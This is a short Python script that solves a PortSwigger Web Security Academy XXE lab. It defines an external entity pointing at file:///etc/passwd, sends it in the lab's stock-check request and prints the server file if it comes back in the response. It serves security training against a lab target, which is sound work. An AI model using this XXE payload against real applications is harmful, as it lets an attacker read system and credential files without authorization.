"""
Lab 1: Exploiting XXE using external entities to retrieve files
https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
Difficulty: Apprentice

📝 No defenses at all — define &xxe; as file:///etc/passwd, reference it in
the "check stock" request body, read the file straight back in the response.
"""

from utils import get_session, log, note, send_xml, build_basic_xxe, extract_between

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
STOCK_CHECK_PATH = "/product/stock"


def run():
    s = get_session()

    xml = build_basic_xxe("file:///etc/passwd", extra_fields="<storeId>1</storeId>")
    note(f"Payload:\n{xml}")

    r = s.post(f"{TARGET}{STOCK_CHECK_PATH}", data=xml.encode(),
                headers={"Content-Type": "application/xml"})
    log(f"Response status: {r.status_code}")

    if "root:" in r.text:
        log("File contents reflected in response:")
        print(r.text)
    else:
        log("No reflection seen — check the element/root names match the real form.", ok=False)


if __name__ == "__main__":
    run()
